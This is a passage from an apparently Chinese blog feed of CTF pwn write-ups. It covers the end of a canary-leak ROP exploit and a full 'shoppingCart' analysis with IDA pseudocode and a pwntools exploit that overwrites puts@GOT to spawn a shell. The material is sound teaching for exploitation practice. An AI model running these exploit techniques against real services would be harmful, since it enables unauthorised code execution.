0x0000000000602F70 &lt;- puts_got</span></span><br><span class="line"><span class="string">    0x000000000040101C &lt;- cmp_md5_true</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    shellcode1 = <span class="string">'A'</span>*<span class="number">0x108</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">    shellcode1 += p64(pop_rdi_ret) + p64(puts_got) + p64(cmp_md5_true)</span><br><span class="line">    io2.send(shellcode1)</span><br><span class="line">    io2.recvuntil(<span class="string">'Congratulations, '</span>)</span><br><span class="line">    puts_addr = u64(io2.recvn(<span class="number">6</span>) + <span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    binsh_addr = libc_base + int(next(libc.search(<span class="string">'/bin/sh'</span>),<span class="number">16</span>))</span><br><span class="line">    io2.recvuntil(<span class="string">'What`s your occupation?\n'</span>)</span><br><span class="line">    io2.send(<span class="string">'A'</span>*<span class="number">0xff</span>)</span><br><span class="line">    io2.recvuntil(<span class="string">'Do you want to edit you introduce by yourself[Y/N]\n'</span>)</span><br><span class="line">    io2.sendline(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    stack status</span></span><br><span class="line"><span class="string">    0x4141414141414141</span></span><br><span class="line"><span class="string">    ........</span></span><br><span class="line"><span class="string">    0x0200cf560c7a0a41 &lt;- canary</span></span><br><span class="line"><span class="string">    0x0000000000000000 &lt;- rbp</span></span><br><span class="line"><span class="string">    0x0000000000401573 &lt;- pop rdi ; ret</span></span><br><span class="line"><span class="string">    0x0000000000602F70 &lt;- '/bin/sh'</span></span><br><span class="line"><span class="string">    0x000000000040101C &lt;- system</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    shellcode2 = <span class="string">'A'</span>*<span class="number">0x108</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">    shellcode2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">    io2.send(shellcode2)</span><br><span class="line"></span><br><span class="line">    io2.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exploit(<span class="string">'127.0.0.1'</span>,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure><h4 id="0x04-总结-2"><a href="#0x04-总结-2" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>这道题前面的Note菜单有点迷惑人，让人以为是一道堆相关的题目，打开IDA分析后，发现与堆没有任何关系。主要考查的是，open()的参数flags的几个选项的作用。还有就是有符号数与无符号数进行比较会发生的错误。以及通过泄露canary的值实现栈溢出，通过ROP绕过NX保护，ret2libc获取shell。</p><h3 id="shoppingCart"><a href="#shoppingCart" class="headerlink" title="shoppingCart"></a>shoppingCart</h3><h4 id="0x00-file-amp-amp-checksec-3"><a href="#0x00-file-amp-amp-checksec-3" class="headerlink" title="0x00 file &amp;&amp; checksec"></a>0x00 file &amp;&amp; checksec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file shoppingCart </span><br><span class="line">shoppingCart: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3fcbc93317b6160fe21ecee679180c2a99c67685, stripped</span><br><span class="line">$ checksec shoppingCart </span><br><span class="line">[*] &apos;/home/...../Desktop/shoppingcart/shoppingCart&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>恩，一个64bit的程序，去除了符号表，开启了全部保护。开了PIE就需要泄露地址，所以有点麻烦。</p><h4 id="0x01-运行程序，观察程序功能-1"><a href="#0x01-运行程序，观察程序功能-1" class="headerlink" title="0x01 运行程序，观察程序功能"></a>0x01 运行程序，观察程序功能</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">buffer@ubuntu64:~/Desktop/shoppingcart$ ./shoppingCart </span><br><span class="line">/***</span><br><span class="line">*    |)    |)    |)    </span><br><span class="line">*    |)L|\/|)L|\/|)L|\/ </span><br><span class="line">*        /     /     / </span><br><span class="line">*/</span><br><span class="line">EMMmmm, you will be a rich man!</span><br><span class="line">cmskmsk</span><br><span class="line">EMMmmm, you will be a rich man!</span><br></pre></td></tr></table></figure><p>程序只是输出了一些信息，并未提示让我们输入什么。所以利用IDA静态分析一下。</p><h4 id="0x02-IDA静态分析"><a href="#0x02-IDA静态分析" class="headerlink" title="0x02 IDA静态分析"></a>0x02 IDA静态分析</h4><p>mian()函数里有两个自定义函数。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">"/***\n*    |)    |)    |)    \n*    |)L|\\/|)L|\\/|)L|\\/ \n*        /     /     / \n*/"</span>)<span class="comment">;</span></span><br><span class="line">  money_menu()<span class="comment">;</span></span><br><span class="line">  goods_menu()<span class="comment">;</span></span><br><span class="line">  puts(<span class="string">"Happy Shopping Day!\nbye~"</span>)<span class="comment">;</span></span><br><span class="line">  return 0LL<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个是与money有关的函数，一个是与goods有关的函数。我们先来看看money_menu()。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">money_menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 option_num; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> option_str; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"EMMmmm, you will be a rich man!"</span>);</span><br><span class="line">      fgets(&amp;option_str, <span class="number">24</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      option_num = strtoul(&amp;option_str, <span class="number">0L</span>L, <span class="number">0</span>);<span class="comment">// 将输入的字符串转化为无符号长整型</span></span><br><span class="line">      <span class="keyword">if</span> ( option_num != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      removemoney();                            <span class="comment">// 输入2时，删除money</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( option_num == <span class="number">3</span> )                      <span class="comment">// 输入3时，跳出</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( option_num == <span class="number">1</span> )                      <span class="comment">// 输入1时，获取money</span></span><br><span class="line">      getmoney();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要输入一个选项，来进入不同的功能。经过分析，输入2时，会执行删除money的操作，但是里面只是提示了不能删除。所以这个功能并没有什么用。输入3时跳出money_menu。输入1时执行getmoney()，所以，我们进入这个函数去看一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getmoney</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 *v0; <span class="comment">// rax</span></span><br><span class="line">  money *money_ptr1; <span class="comment">// rax</span></span><br><span class="line">  money *money_ptr2; <span class="comment">// ST08_8</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 money_num; <span class="comment">// rcx money_list索引</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( money_sum &lt;= <span class="number">19</span> )                        <span class="comment">// money种类数量</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"I will give you $9999, but what's the  currency type you want, RMB or Dollar?"</span>);</span><br><span class="line">    money_ptr1 = <span class="built_in">malloc</span>(<span class="number">16u</span>LL);                 <span class="comment">// 给结构体分配内存</span></span><br><span class="line">    money_ptr2 = money_ptr1;</span><br><span class="line">    money_ptr1-&gt;num = <span class="number">9999L</span>L;</span><br><span class="line">    fgets(&amp;money_type[<span class="number">8</span> * money_sum], <span class="number">8</span>, <span class="built_in">stdin</span>);<span class="comment">// 将money_type存到.bss段的数组中</span></span><br><span class="line">    money_ptr2-&gt;money_type = &amp;money_type[<span class="number">8</span> * money_sum];<span class="comment">// 将money_type的字符串指针存入结构体成员money_type中</span></span><br><span class="line">    v3 = money_sum++;</span><br><span class="line">    money_num = v3;</span><br><span class="line">    v0 = money_list;</span><br><span class="line">    money_list[money_num] = money_ptr2;         <span class="comment">// 将结构体指针存到.bss段的数组中</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"You already have enough money!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是经过优化的代码，我们看起来会比较好理解一点，原本并不是这样的。初始状态不仔细看是不容易看不出来有money和goods两个结构体的(对于新手来说)，我们需要利用IDA的优化代码的功能，添加这两个结构体。具体的添加方法可以参考IDA Pro权威指南。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00000000 money           struc ; (sizeof=0x10, mappedto_6)</span><br><span class="line">00000000 money_type      dq ?</span><br><span class="line">00000008 num             dq ?</span><br><span class="line">00000010 money           ends</span><br><span class="line">00000010</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 goods           struc ; (sizeof=0x10, mappedto_7)</span><br><span class="line">00000000 goods_name      dq ?</span><br><span class="line">00000008 num             dq ?</span><br><span class="line">00000010 goods           ends</span><br><span class="line">00000010</span><br></pre></td></tr></table></figure><p>这个函数能够在堆上最多定义20个money结构体，每个money结构体具有两个成员，money_type和num，num是固定的9999，money_type是任意的，也可以使用题目说的RMB和Dollar，并不会影响解题。结构体对象是存在堆上的，前8个字节存储money_type字符串的地址，而money_type是存储在.bss段的，并且最后也会将money结构体对象的指针存入.bss段的一个数组中，我将其命名为money_list。</p><p>我们再来看看goods_menu()函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">goods_menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 option_num; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> option_str; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Now, buy buy buy!"</span>);</span><br><span class="line">          fgets(&amp;option_str, <span class="number">24</span>, <span class="built_in">stdin</span>);</span><br><span class="line">          option_num = strtoul(&amp;option_str, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( option_num != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          delete_goods();                       <span class="comment">// 输入2，删除goods</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( option_num &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( option_num == <span class="number">1</span> )</span><br><span class="line">          add_goods();                          <span class="comment">// 输入1，添加goods</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( option_num != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit_goods();                             <span class="comment">// 输入3，编辑goods</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( option_num != <span class="number">4</span> );</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>goods具有三个选项，add、delete、edit，问题出现在add_goods()函数和edit_goods()函数中。这里需要说明一下，用堆的做法，会涉及到add_goods()和edit_goods()中的两个漏洞，另一种方法只会使用到edit_goods()中用来泄露地址的漏洞。这里先说说不用堆的方法吧，用堆的方法，我暂时还没有弄清楚，我们进入edit_goods()函数看一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit_goods</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 goods_num; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// ST00_8 v1=goods_num</span></span><br><span class="line">  <span class="keyword">char</span> goods_num_str; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which goods you need to modify?"</span>);</span><br><span class="line">  fgets(&amp;goods_num_str, <span class="number">24</span>, <span class="built_in">stdin</span>);             <span class="comment">// 这里输入负数，经过strtoul转换后，会造成数组的越界访问</span></span><br><span class="line">  goods_num = strtoul(&amp;goods_num_str, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"OK, what would you like to modify %s to?\n"</span>, *goods_list[goods_num], goods_num);<span class="comment">// 这里可以用来泄露地址</span></span><br><span class="line">  *(*goods_list[v1] + read(<span class="number">0</span>, *goods_list[v1], <span class="number">8u</span>LL)) = <span class="number">0</span>;<span class="comment">// 这里会造成任意地址写</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此函数中没有对输入的数据进行验证，当我们修改goods参数时，输入的goods编号为负数时，经过strtoul转换后，会造成后面打印的时候，越界读取数组，泄露地址信息。修改数据的时候会造成任意地址写。我们再来看看.bss段上数据的排布：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000202090 goods_sum       dq ?                    ; DATA XREF: add_goods+17↑r</span><br><span class="line">.bss:0000000000202090                                         ; add_goods+E1↑r ...</span><br><span class="line">.bss:0000000000202098 money_sum       dq ?                    ; DATA XREF: getmoney+8↑r</span><br><span class="line">.bss:0000000000202098                                         ; getmoney+53↑r ...</span><br><span class="line">.bss:00000000002020A0 ; char money_type[160]</span><br><span class="line">.bss:00000000002020A0 money_type      db 0A0h dup(?)          ; 0</span><br><span class="line">.bss:00000000002020A0                                         ; DATA XREF: getmoney+62↑o</span><br><span class="line">.bss:00000000002020A0                                         ; getmoney+8B↑o</span><br><span class="line">.bss:0000000000202140 money_list      dq 14h dup(?)           ; 0</span><br><span class="line">.bss:0000000000202140                                         ; DATA XREF: getmoney+B6↑o</span><br><span class="line">.bss:00000000002021E0 ; _QWORD goods_list[20]</span><br><span class="line">.bss:00000000002021E0 goods_list      dq 14h dup(?)           ; 0</span><br><span class="line">.bss:00000000002021E0                                         ; DATA XREF: add_goods+FB↑o</span><br><span class="line">.bss:00000000002021E0                                         ; delete_check+24↑o ...</span><br></pre></td></tr></table></figure><p>可以看到money_type、money_list、goods_list都是相连的，通过对goods_list的越界读取，可以泄露出程序的某一处地址。说来也巧，刚好在其上面不远处有一个指向自身的指针，我们可以计算偏移，泄露出此处的地址，计算出elf文件的加载基址。这处地址在elf文件的偏移0x202068处。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202068</span> off_202068      <span class="built_in">dq</span> offset off_202068    <span class="comment">; DATA XREF: sub_940+17↑r</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202068</span>                                         <span class="comment">; .data:off_202068↓o</span></span><br></pre></td></tr></table></figure><h4 id="0x03-exp-non-heap"><a href="#0x03-exp-non-heap" class="headerlink" title="0x03 exp(non-heap)"></a>0x03 exp(non-heap)</h4><p>利用思路：</p><blockquote><p>1、调用getmoney()获得money，这里可以只获得两个money，因为后面只用到了money_list的前两个，也可以添加满20个。<br>2、利用edit_goods()泄露elf偏移0x202068处的地址，并计算出elf文件的加载基址，再计算出puts_got的地址。这里为什么不能直接泄露got表函数的地址，后面再说。<br>3、修改money_list[0]中的指针为money_list[1]的地址，修改money_list[1]中的指针为puts_got的地址。这里是为了泄露puts函数地址并且修改got表。因为修改goods_name的时候，是一个二级指针结构，所以这里也需要构造成一个二级指针结构。<br>4、然后将libc中的execv(“/bin/sh”)片段地址覆盖puts_got地址，再次调用puts()时，就会执行execv(“/bin/sh”)。</p></blockquote><p>第二步为什么不能直接泄露puts_got的内容，就是因为第三步中所说的，泄漏的内容需要具有一个二级指针结构。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary =<span class="string">'./shoppingCart'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getmoney</span><span class="params">(io,num)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        io.sendlineafter(<span class="string">'EMMmmm, you will be a rich man!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">'RMB or Dollar?\n'</span>,<span class="string">'RMB'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'EMMmmm, you will be a rich man!\n'</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_goods</span><span class="params">(io,index,content,flag)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Now, buy buy buy!\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'Which goods you need to modify?\n'</span>,index)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        io.recvuntil(<span class="string">'OK, what would you like to modify '</span>)</span><br><span class="line">        addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">        <span class="keyword">return</span> addr</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(<span class="string">'./shoppingCart'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">getmoney(io,<span class="number">0x14</span>)</span><br><span class="line">addr = edit_goods(io,<span class="string">'-47'</span>,<span class="string">''</span>,<span class="number">1</span>)</span><br><span class="line">elf_base = addr - <span class="number">0x202068</span></span><br><span class="line"></span><br><span class="line">io.sendline(p64(addr))</span><br><span class="line">puts_got = elf_base + <span class="number">0x202020</span></span><br><span class="line">money_name1 = elf_base + <span class="number">0x2020a8</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">edit_goods(io,<span class="string">'-0x14'</span>,p64(money_name1),<span class="number">0</span>)  <span class="comment">#money_name[0]-&gt;money_name[1]</span></span><br><span class="line">edit_goods(io,<span class="string">'-0x13'</span>,p64(puts_got),<span class="number">0</span>)   <span class="comment">#money_name[1]=puts_got</span></span><br><span class="line"></span><br><span class="line">puts_addr = edit_goods(io,<span class="string">'-0x28'</span>,<span class="string">''</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">shell = p64(libc_base + <span class="number">0x45216</span>)</span><br><span class="line">io.send(shell)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://laucyun.com/3411bc6f400207178b85defa04474b4a.html#directory-0146717171785671911" target="_blank" rel="noopener">https://laucyun.com/3411bc6f400207178b85defa04474b4a.html#directory-0146717171785671911</a><br><a href="https://xz.aliyun.com/t/2897#" target="_blank" rel="noopener">https://xz.aliyun.com/t/2897#</a><br><a href="https://veritas501.space/2018/10/15/%E6%8A%A4%E7%BD%91%E6%9D%AF%20pwn%20wp/" target="_blank" rel="noopener">https://veritas501.space/2018/10/15/%E6%8A%A4%E7%BD%91%E6%9D%AF%20pwn%20wp/</a></p><p><a href="https://blog.csdn.net/w12315q/article/details/83119560" target="_blank" rel="noopener">https://blog.csdn.net/w12315q/article/details/83119560</a><br><a href="http://m4x.fun/post/hwb2018-pwn-writeup/" target="_blank" rel="noopener">http://m4x.fun/post/hwb2018-pwn-writeup/</a><br><a href="https://www.jianshu.com/p/9375c32b2159" target="_blank" rel="noopener">https://www.jianshu.com/p/9375c32b2159</a></p><p><a href="https://www.freebuf.com/articles/rookie/155971.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/rookie/155971.html</a><br><a href="http://p4nda.top/2018/10/14/hwb-ctf-2018/" target="_blank" rel="noopener">http://p4nda.top/2018/10/14/hwb-ctf-2018/</a><br><a href="https://blog.csdn.net/qq_38204481/article/details/83216384" target="_blank" rel="noopener">https://blog.csdn.net/qq_38204481/article/details/83216384</a><br><a href="http://transparentsite.top/2018/10/%E6%8A%A4%E7%BD%91%E6%9D%AFpwn-shoppingcart/" target="_blank" rel="noopener">http://transparentsite.top/2018/10/%E6%8A%A4%E7%BD%91%E6%9D%AFpwn-shoppingcart/</a><br><a href="https://www.jianshu.com/p/b96e90ff6f72" target="_blank" rel="noopener">https://www.jianshu.com/p/b96e90ff6f72</a><br><a href="https://waterdrop-team.github.io/2018/10/13/hwb-2018-writeup/" target="_blank" rel="noopener">https://waterdrop-team.github.io/2018/10/13/hwb-2018-writeup/</a><br><a href="http://blog.leanote.com/cate/xp0int/%E6%8A%A4%E7%BD%91%E6%9D%AF2018" target="_blank" rel="noopener">http://blog.leanote.com/cate/xp0int/%E6%8A%A4%E7%BD%91%E6%9D%AF2018</a></p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2010-2883复现与分析</title>
      <link href="/2018/06/01/CVE-2010-2883%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
      <url>/2018/06/01/CVE-2010-2883%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
